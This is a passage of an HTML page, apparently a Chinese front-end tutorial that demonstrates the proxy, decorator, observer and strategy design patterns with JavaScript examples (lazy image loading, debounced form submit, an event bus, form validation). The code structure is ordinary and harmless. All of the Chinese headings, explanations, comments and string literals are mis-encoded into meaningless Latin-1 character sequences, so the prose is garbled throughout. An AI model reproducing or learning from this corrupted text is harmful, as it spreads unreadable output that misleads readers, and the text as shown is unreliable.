<li>æƒé™æ§åˆ¶ï¼ˆä»£ç†æ‹¦æˆªæ— æƒé™çš„æ“ä½œï¼‰</li>
<li>æ•°æ®ç¼“å­˜ï¼ˆä»£ç†ç¼“å­˜é‡å¤è¯·æ±‚çš„ç»“æœï¼‰</li>
<li>Vue3 çš„å“åº”å¼åŸç†ï¼ˆåŸºäº ES6 Proxy å®ç°ï¼‰
<strong>Demo ä»£ç ï¼ˆå›¾ç‰‡æ‡’åŠ è½½ï¼‰</strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// çœŸå®çš„å›¾ç‰‡åŠ è½½ç±» </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RealImage</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">url</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">url</span> = url; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadImage</span>(); 
    } 
    <span class="hljs-comment">// å®é™…åŠ è½½å›¾ç‰‡ </span>
    <span class="hljs-title function_">loadImage</span>(<span class="hljs-params"/>) { 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¼€å§‹åŠ è½½å›¾ç‰‡ï¼š<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.url}</span>`</span>); 
        <span class="hljs-comment">// æ¨¡æ‹Ÿå›¾ç‰‡åŠ è½½è€—æ—¶ </span>
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å›¾ç‰‡ <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.url}</span> åŠ è½½å®Œæˆ`</span>); 
        }, <span class="hljs-number">1000</span>); 
    } 
    <span class="hljs-comment">// æ¸²æŸ“å›¾ç‰‡ </span>
    <span class="hljs-title function_">render</span>(<span class="hljs-params">container</span>) { 
        <span class="hljs-keyword">const</span> img = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'img'</span>); 
        img.<span class="hljs-property">src</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">url</span>; 
        img.<span class="hljs-property">alt</span> = <span class="hljs-string">'ç¤ºä¾‹å›¾ç‰‡'</span>; 
        container.<span class="hljs-title function_">appendChild</span>(img); 
    } 
}
<span class="hljs-comment">// å›¾ç‰‡ä»£ç†ç±»ï¼ˆæ‡’åŠ è½½ï¼‰ </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageProxy</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">url</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">url</span> = url; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">realImage</span> = <span class="hljs-literal">null</span>; 
        <span class="hljs-comment">// å»¶è¿Ÿåˆ›å»ºçœŸå®å›¾ç‰‡å®ä¾‹ </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">placeholder</span> = <span class="hljs-string">'https://via.placeholder.com/100x100?text=Loading'</span>; <span class="hljs-comment">// å ä½å›¾ </span>
    } 
    <span class="hljs-comment">// ä»£ç†æ¸²æŸ“é€»è¾‘ </span>
    <span class="hljs-title function_">render</span>(<span class="hljs-params">container</span>) { 
        <span class="hljs-comment">// å…ˆæ¸²æŸ“å ä½å›¾ </span>
        <span class="hljs-keyword">const</span> placeholderImg = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'img'</span>);
        placeholderImg.<span class="hljs-property">src</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">placeholder</span>; 
        placeholderImg.<span class="hljs-property">alt</span> = <span class="hljs-string">'åŠ è½½ä¸­'</span>; 
        container.<span class="hljs-title function_">appendChild</span>(placeholderImg); 
        <span class="hljs-comment">// æ¨¡æ‹Ÿæ»šåŠ¨åˆ°å¯è§†åŒºåŸŸååŠ è½½çœŸå®å›¾ç‰‡ </span>
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> { 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">realImage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RealImage</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">url</span>); 
            <span class="hljs-comment">// æ›¿æ¢å ä½å›¾</span>
            container.<span class="hljs-title function_">removeChild</span>(placeholderImg); 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">realImage</span>.<span class="hljs-title function_">render</span>(container); 
        }, <span class="hljs-number">2000</span>); 
    } 
} 
<span class="hljs-comment">// æµ‹è¯•ï¼šä½¿ç”¨ä»£ç†åŠ è½½å›¾ç‰‡ </span>
<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'image-container'</span>) || <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>; 
<span class="hljs-keyword">const</span> imageProxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageProxy</span>(<span class="hljs-string">'https://picsum.photos/400/300'</span>);
imageProxy.<span class="hljs-title function_">render</span>(container); 
</code></pre>
<h3 data-id="heading-6">2. è£…é¥°å™¨æ¨¡å¼ (Decorator)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šåŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼Œè€Œä¸æ”¹å˜å…¶åŸæœ‰ç»“æ„ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>ç»™ç»„ä»¶æ·»åŠ é¢å¤–åŠŸèƒ½ï¼ˆå¦‚æŒ‰é’®æ·»åŠ é˜²æŠ–ã€è¾“å…¥æ¡†æ·»åŠ æ ¡éªŒï¼‰</li>
<li>æƒé™è£…é¥°ï¼ˆç»™ä¸åŒè§’è‰²çš„æŒ‰é’®æ·»åŠ ä¸åŒæ“ä½œæƒé™ï¼‰</li>
<li>æ—¥å¿—è£…é¥°ï¼ˆç»™å‡½æ•°æ·»åŠ æ—¥å¿—è®°å½•åŠŸèƒ½ï¼‰</li>
</ul>
<p><strong>Demo ä»£ç ï¼ˆå‡½æ•°è£…é¥°å™¨ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŸºç¡€å‡½æ•°ï¼šæäº¤è¡¨å• </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params">data</span>) { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æäº¤è¡¨å•æ•°æ®ï¼š'</span>, data); 
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">'æäº¤æˆåŠŸ'</span> }; 
} 
<span class="hljs-comment">// è£…é¥°å™¨1ï¼šé˜²æŠ–è£…é¥° </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounceDecorator</span>(<span class="hljs-params">fn, delay = <span class="hljs-number">500</span></span>) { 
    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>; 
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) { 
        <span class="hljs-built_in">clearTimeout</span>(timer); 
        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> { fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); }, delay); 
    }; 
} 
<span class="hljs-comment">// è£…é¥°å™¨2ï¼šæ—¥å¿—è£…é¥° </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">logDecorator</span>(<span class="hljs-params">fn</span>) { 
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) { 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toLocaleString()}</span>] æ‰§è¡Œå‡½æ•°ï¼š<span class="hljs-subst">${fn.name}</span>`</span>); 
        <span class="hljs-keyword">const</span> result = fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toLocaleString()}</span>] å‡½æ•°æ‰§è¡Œç»“æœï¼š`</span>, result); 
        <span class="hljs-keyword">return</span> result; 
    }; 
} 
<span class="hljs-comment">// è£…é¥°å™¨3ï¼šæ ¡éªŒè£…é¥° </span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateDecorator</span>(<span class="hljs-params">fn</span>) { 
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) { 
        <span class="hljs-keyword">const</span> data = args[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (!data || !data.<span class="hljs-property">username</span>) { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ ¡éªŒå¤±è´¥ï¼šç”¨æˆ·åä¸èƒ½ä¸ºç©º'</span>); 
            <span class="hljs-keyword">return</span> { <span class="hljs-attr">code</span>: <span class="hljs-number">400</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">'ç”¨æˆ·åä¸èƒ½ä¸ºç©º'</span> }; 
        } 
        <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); 
    }; 
} 
<span class="hljs-comment">// ç»„åˆè£…é¥°å™¨ï¼šç»™æäº¤å‡½æ•°æ·»åŠ é˜²æŠ–+æ—¥å¿—+æ ¡éªŒ </span>
<span class="hljs-keyword">const</span> decoratedSubmit = <span class="hljs-title function_">debounceDecorator</span>(<span class="hljs-title function_">logDecorator</span>(<span class="hljs-title function_">validateDecorator</span>(submitForm)));
<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-title function_">decoratedSubmit</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span> }); <span class="hljs-comment">// æ ¡éªŒå¤±è´¥</span>
<span class="hljs-title function_">decoratedSubmit</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">'zhangsan'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }); <span class="hljs-comment">// é˜²æŠ–åæ‰§è¡Œï¼Œå¸¦æ—¥å¿— </span>
<span class="hljs-title function_">decoratedSubmit</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">'zhangsan'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }); <span class="hljs-comment">// é‡å¤ç‚¹å‡»è¢«é˜²æŠ–æ‹¦æˆª </span>
</code></pre>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€è¡Œä¸ºå‹æ¨¡å¼</h2>
<p>è¿™ç±»æ¨¡å¼å…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡å’Œäº¤äº’ï¼Œä¼˜åŒ–å¯¹è±¡çš„è¡Œä¸ºé€»è¾‘ã€‚</p>
<h3 data-id="heading-8">1. è§‚å¯Ÿè€…æ¨¡å¼ (Observer)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šå®šä¹‰å¯¹è±¡é—´çš„ä¸€å¯¹å¤šä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çŠ¶æ€æ”¹å˜æ—¶ï¼Œæ‰€æœ‰ä¾èµ–å®ƒçš„å¯¹è±¡éƒ½ä¼šæ”¶åˆ°é€šçŸ¥å¹¶è‡ªåŠ¨æ›´æ–°ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶ç›‘å¬ï¼ˆå¦‚ DOM äº‹ä»¶ã€è‡ªå®šä¹‰äº‹ä»¶ï¼‰</li>
<li>å‘å¸ƒè®¢é˜…ç³»ç»Ÿï¼ˆå¦‚ Vue çš„ EventBusï¼‰</li>
<li>çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ React çŠ¶æ€æ›´æ–°ã€Vue çš„å“åº”å¼ï¼‰</li>
<li>æ¶ˆæ¯é€šçŸ¥ç³»ç»Ÿ</li>
</ul>
<p><strong>Demo ä»£ç ï¼ˆè‡ªå®šä¹‰äº‹ä»¶æ€»çº¿ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è§‚å¯Ÿè€…æ¨¡å¼å®ç°ï¼ˆäº‹ä»¶æ€»çº¿ï¼‰ </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventBus</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span> = {}; <span class="hljs-comment">// å­˜å‚¨äº‹ä»¶å’Œå¯¹åº”çš„å›è°ƒå‡½æ•° </span>
    } 
    <span class="hljs-comment">// è®¢é˜…äº‹ä»¶ </span>
    <span class="hljs-title function_">on</span>(<span class="hljs-params">eventName, callback</span>) { 
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName]) { 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName] = []; 
        } 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName].<span class="hljs-title function_">push</span>(callback); 
    } 
    <span class="hljs-comment">// å–æ¶ˆè®¢é˜… </span>
    <span class="hljs-title function_">off</span>(<span class="hljs-params">eventName, callback</span>) { 
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName])
            <span class="hljs-keyword">return</span>; 
        <span class="hljs-keyword">if</span> (callback) { 
            <span class="hljs-comment">// ç§»é™¤æŒ‡å®šå›è°ƒ </span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> fn !== callback); 
        } <span class="hljs-keyword">else</span> { 
            <span class="hljs-comment">// æ¸…ç©ºè¯¥äº‹ä»¶æ‰€æœ‰å›è°ƒ </span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName] = []; 
        }
    } 
    <span class="hljs-comment">// å‘å¸ƒäº‹ä»¶ï¼ˆè§¦å‘ï¼‰ </span>
    <span class="hljs-title function_">emit</span>(<span class="hljs-params">eventName, ...args</span>) { 
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName]) 
        <span class="hljs-keyword">return</span>; 
        <span class="hljs-comment">// æ‰§è¡Œæ‰€æœ‰è®¢é˜…çš„å›è°ƒ </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> { callback.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); });
    } 
    <span class="hljs-comment">// ä¸€æ¬¡æ€§è®¢é˜… </span>
    <span class="hljs-title function_">once</span>(<span class="hljs-params">eventName, callback</span>) { 
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">wrapCallback</span> = (<span class="hljs-params">...args</span>) =&gt; { 
            callback.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); 
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(eventName, wrapCallback); <span class="hljs-comment">// æ‰§è¡Œåå–æ¶ˆè®¢é˜… </span>
        }; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventName, wrapCallback); 
    } 
}
<span class="hljs-comment">// æµ‹è¯•ï¼šä½¿ç”¨äº‹ä»¶æ€»çº¿ </span>
<span class="hljs-keyword">const</span> bus = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventBus</span>(); 

<span class="hljs-comment">// è®¢é˜…äº‹ä»¶ </span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleMsg</span> = (<span class="hljs-params">msg</span>) =&gt; { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”¶åˆ°æ¶ˆæ¯ï¼š'</span>, msg); 
};
bus.<span class="hljs-title function_">on</span>(<span class="hljs-string">'message'</span>, handleMsg); 

<span class="hljs-comment">// ä¸€æ¬¡æ€§è®¢é˜… </span>
bus.<span class="hljs-title function_">once</span>(<span class="hljs-string">'onceMsg'</span>, <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> { 
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸€æ¬¡æ€§æ¶ˆæ¯ï¼š'</span>, msg); 
});

<span class="hljs-comment">// å‘å¸ƒäº‹ä»¶ </span>
bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'message'</span>, <span class="hljs-string">'Hello Observer Pattern'</span>); <span class="hljs-comment">// æ”¶åˆ°æ¶ˆæ¯ï¼šHello Observer Pattern </span>
bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'onceMsg'</span>, <span class="hljs-string">'This is once'</span>); <span class="hljs-comment">// ä¸€æ¬¡æ€§æ¶ˆæ¯ï¼šThis is once </span>
bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'onceMsg'</span>, <span class="hljs-string">'This will not be received'</span>); <span class="hljs-comment">// æ— è¾“å‡º </span>

<span class="hljs-comment">// å–æ¶ˆè®¢é˜… </span>
bus.<span class="hljs-title function_">off</span>(<span class="hljs-string">'message'</span>, handleMsg); bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'message'</span>, <span class="hljs-string">'This will not be received'</span>); <span class="hljs-comment">// æ— è¾“å‡º </span>
</code></pre>
<h3 data-id="heading-9">2. ç­–ç•¥æ¨¡å¼ (Strategy)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šå®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼Œå°†æ¯ä¸ªç®—æ³•å°è£…èµ·æ¥ï¼Œå¹¶ä½¿å®ƒä»¬å¯ä»¥äº’ç›¸æ›¿æ¢ï¼Œè®©ç®—æ³•çš„å˜åŒ–ç‹¬ç«‹äºä½¿ç”¨ç®—æ³•çš„å®¢æˆ·ç«¯ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>è¡¨å•æ ¡éªŒè§„åˆ™ï¼ˆä¸åŒå­—æ®µç”¨ä¸åŒæ ¡éªŒç­–ç•¥ï¼‰</li>
<li>æ”¯ä»˜æ–¹å¼é€‰æ‹©ï¼ˆæ”¯ä»˜å®/å¾®ä¿¡/é“¶è¡Œå¡ï¼‰</li>
<li>æ’åºç®—æ³•åˆ‡æ¢ï¼ˆå¿«é€Ÿæ’åº/å†’æ³¡æ’åºï¼‰</li>
<li>ä»·æ ¼è®¡ç®—ç­–ç•¥ï¼ˆæ™®é€šç”¨æˆ·/VIP/è¶…çº§VIPï¼‰</li>
</ul>
<p><strong>Demo ä»£ç ï¼ˆè¡¨å•æ ¡éªŒï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®šä¹‰æ ¡éªŒç­–ç•¥ </span>
<span class="hljs-keyword">const</span> validateStrategies = { 
    <span class="hljs-comment">// éç©ºæ ¡éªŒ </span>
    <span class="hljs-attr">required</span>: <span class="hljs-function">(<span class="hljs-params">value, errorMsg</span>) =&gt;</span> { 
        <span class="hljs-keyword">if</span> (value === <span class="hljs-string">''</span> || value === <span class="hljs-literal">undefined</span> || value === <span class="hljs-literal">null</span>) { 
            <span class="hljs-keyword">return</span> errorMsg; 
        } 
    }, 
    <span class="hljs-comment">// æœ€å°é•¿åº¦æ ¡éªŒ </span>
    <span class="hljs-attr">minLength</span>: <span class="hljs-function">(<span class="hljs-params">value, length, errorMsg</span>) =&gt;</span> { 
        <span class="hljs-keyword">if</span> (value &amp;&amp; value.<span class="hljs-property">length</span> &lt; length) { 
            <span class="hljs-keyword">return</span> errorMsg; 
        } 
    }, 
    <span class="hljs-comment">// æ‰‹æœºå·æ ¡éªŒ </span>
    <span class="hljs-attr">mobile</span>: <span class="hljs-function">(<span class="hljs-params">value, errorMsg</span>) =&gt;</span> { 
        <span class="hljs-keyword">const</span> reg = <span class="hljs-regexp">/^1[3-9]\d{9}$/</span>; 
        <span class="hljs-keyword">if</span> (value &amp;&amp; !reg.<span class="hljs-title function_">test</span>(value)) { 
            <span class="hljs-keyword">return</span> errorMsg; 
        } 
    }, 
    <span class="hljs-comment">// é‚®ç®±æ ¡éªŒ </span>
    <span class="hljs-attr">email</span>: <span class="hljs-function">(<span class="hljs-params">value, errorMsg</span>) =&gt;</span> { 
        <span class="hljs-keyword">const</span> reg = <span class="hljs-regexp">/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/</span>; 
        <span class="hljs-keyword">if</span> (value &amp;&amp; !reg.<span class="hljs-title function_">test</span>(value)) { 
            <span class="hljs-keyword">return</span> errorMsg; 
        } 
    } 
}; 
<span class="hljs-comment">// æ ¡éªŒå™¨ç±» </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Validator</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = []; <span class="hljs-comment">// å­˜å‚¨æ ¡éªŒè§„åˆ™ </span>
    } 
    <span class="hljs-comment">// æ·»åŠ æ ¡éªŒè§„åˆ™ </span>
    <span class="hljs-title function_">add</span>(<span class="hljs-params">value, rules</span>) { 
        rules.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">rule</span> =&gt;</span> { 
            <span class="hljs-keyword">const</span> { strategy, errorMsg, param } = rule; 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> { 
                <span class="hljs-comment">// æ‹†åˆ†ç­–ç•¥ï¼ˆå¦‚ minLength:6 æ‹†åˆ†ä¸º minLength å’Œ 6ï¼‰ </span>
                <span class="hljs-keyword">const</span> [strategyName, strategyParam] = strategy.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>); 
                <span class="hljs-keyword">return</span> validateStrategies[strategyName](value, strategyParam || param, errorMsg); 
            }); 
        });
    } 
    <span class="hljs-comment">// æ‰§è¡Œæ ¡éªŒ </span>
    <span class="hljs-title function_">validate</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> rule <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>) { 
            <span class="hljs-keyword">const</span> errorMsg = <span class="hljs-title function_">rule</span>(); 
            <span class="hljs-keyword">if</span> (errorMsg) { 
                <span class="hljs-keyword">return</span> errorMsg; <span class="hljs-comment">// æœ‰é”™è¯¯ç«‹å³è¿”å› </span>
            } 
        } 
        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>; <span class="hljs-comment">// æ ¡éªŒé€šè¿‡ </span>
    } 
} 
<span class="hljs-comment">// æµ‹è¯•ï¼šè¡¨å•æ ¡éªŒ </span>
<span class="hljs-keyword">const</span> formData = { 
    <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, 
    <span class="hljs-attr">password</span>: <span class="hljs-string">'123'</span>, 
    <span class="hljs-attr">mobile</span>: <span class="hljs-string">'1234567890'</span>, 
    <span class="hljs-attr">email</span>: <span class="hljs-string">'test@example'</span> 
}; 
<span class="hljs-comment">// åˆ›å»ºæ ¡éªŒå™¨å¹¶æ·»åŠ è§„åˆ™ </span>
<span class="hljs-keyword">const</span> validator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Validator</span>(); 
validator.<span class="hljs-title function_">add</span>(formData.<span class="hljs-property">username</span>, [{ <span class="hljs-attr">strategy</span>: <span class="hljs-string">'required'</span>, <span class="hljs-attr">errorMsg</span>: <span class="hljs-string">'ç”¨æˆ·åä¸èƒ½ä¸ºç©º'</span> }]);
validator.<span class="hljs-title function_">add</span>(formData.<span class="hljs-property">password</span>, [ { <span class="hljs-attr">strategy</span>: <span class="hljs-string">'required'</span>, <span class="hljs-attr">errorMsg</span>: <span class="hljs-string">'å¯†ç ä¸èƒ½ä¸ºç©º'</span> }, { <span class="hljs-attr">strategy</span>: <span class="hljs-string">'minLength:6'</span>, <span class="hljs-attr">errorMsg</span>: <span class="hljs-string">'å¯†ç é•¿åº¦ä¸èƒ½å°‘äº6ä½'</span> } ]); 
validator.<span class="hljs-title function_">add</span>(formData.<span class="hljs-property">mobile</span>, [{ <span class="hljs-attr">strategy</span>: <span class="hljs-string">'mobile'</span>, <span class="hljs-attr">errorMsg</span>: <span class="hljs-string">'æ‰‹æœºå·æ ¼å¼é”™è¯¯'</span> }]);
validator.<span class="hljs-title function_">add</span>(formData.<span class="hljs-property">email</span>, [{ <span class="hljs-attr">strategy</span>: <span class="hljs-string">'email'</span>, <span class="hljs-attr">errorMsg</span>: <span class="hljs-string">'é‚®ç®±æ ¼å¼é”™è¯¯'</span> }]); 
<span class="hljs-comment">// æ‰§è¡Œæ ¡éªŒ </span>
<span class="hljs-keyword">const</span> errorMsg = validator.<span class="hljs-title function_">validate</span>(); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(errorMsg); <span class="hljs-comment">// ç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼ˆç¬¬ä¸€ä¸ªé”™è¯¯ï¼‰ </span>
</code></pre>
<hr/>
<h3 data-id="heading-10">æ€»ç»“</h3>
<p>å‰ç«¯å¼€å‘ä¸­é«˜é¢‘ä½¿ç”¨çš„è®¾è®¡æ¨¡å¼åŠæ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ol>
<li><strong>å•ä¾‹æ¨¡å¼</strong>ï¼šä¿è¯å”¯ä¸€å®ä¾‹ï¼Œé€‚ç”¨äºå…¨å±€ç»„ä»¶/ç¼“å­˜/äº‹ä»¶æ€»çº¿ï¼Œæ ¸å¿ƒæ˜¯ç¼“å­˜å®ä¾‹å¹¶å¤ç”¨ã€‚</li>
<li><strong>å·¥å‚æ¨¡å¼</strong>ï¼šå°è£…å¯¹è±¡åˆ›å»ºé€»è¾‘ï¼Œé€‚ç”¨äºå¤šç±»å‹ç»„ä»¶/å·¥å…·åˆ›å»ºï¼Œæ ¸å¿ƒæ˜¯æ ¹æ®å‚æ•°è¿”å›ä¸åŒå®ä¾‹ã€‚</li>
<li><strong>ä»£ç†æ¨¡å¼</strong>ï¼šæ§åˆ¶å¯¹è±¡è®¿é—®ï¼Œé€‚ç”¨äºæ‡’åŠ è½½/æƒé™æ§åˆ¶/ç¼“å­˜ï¼Œæ ¸å¿ƒæ˜¯ã€Œæ›¿èº«ã€æ‹¦æˆªå¹¶å¤„ç†é€»è¾‘ã€‚</li>
<li><strong>è£…é¥°å™¨æ¨¡å¼</strong>ï¼šåŠ¨æ€æ‰©å±•åŠŸèƒ½ï¼Œé€‚ç”¨äºå‡½æ•°å¢å¼º/ç»„ä»¶æ‰©å±•ï¼Œæ ¸å¿ƒæ˜¯ä¸ä¿®æ”¹åŸå¯¹è±¡ä»…æ·»åŠ èŒè´£ã€‚</li>
<li><strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>ï¼šä¸€å¯¹å¤šé€šçŸ¥ï¼Œé€‚ç”¨äºäº‹ä»¶ç³»ç»Ÿ/çŠ¶æ€ç®¡ç†ï¼Œæ ¸å¿ƒæ˜¯å‘å¸ƒ-è®¢é˜…çš„è§£è€¦é€šä¿¡ã€‚</li>
<li><strong>ç­–ç•¥æ¨¡å¼</strong>ï¼šç®—æ³•å°è£…ä¸æ›¿æ¢ï¼Œé€‚ç”¨äºæ ¡éªŒ/æ”¯ä»˜/æ’åºï¼Œæ ¸å¿ƒæ˜¯å°†ç®—æ³•ä¸ä½¿ç”¨é€»è¾‘åˆ†ç¦»ã€‚
è¿™äº›æ¨¡å¼çš„æ ¸å¿ƒä»·å€¼æ˜¯<strong>è§£è€¦ã€å¤ç”¨ã€å¯æ‰©å±•</strong>ï¼Œå®é™…å¼€å‘ä¸­ä¸å¿…ç”Ÿæ¬ç¡¬å¥—ï¼Œè€Œæ˜¯æ ¹æ®åœºæ™¯çµæ´»è¿ç”¨ï¼Œæ¯”å¦‚ Vue/React æ¡†æ¶å†…éƒ¨å°±å¤§é‡ä½¿ç”¨äº†è¿™äº›æ¨¡å¼ï¼ˆå¦‚ React çš„åˆæˆäº‹ä»¶ç”¨äº†è§‚å¯Ÿè€…æ¨¡å¼ï¼ŒVue3 çš„å“åº”å¼ç”¨äº†ä»£ç†æ¨¡å¼ï¼‰ã€‚</li>
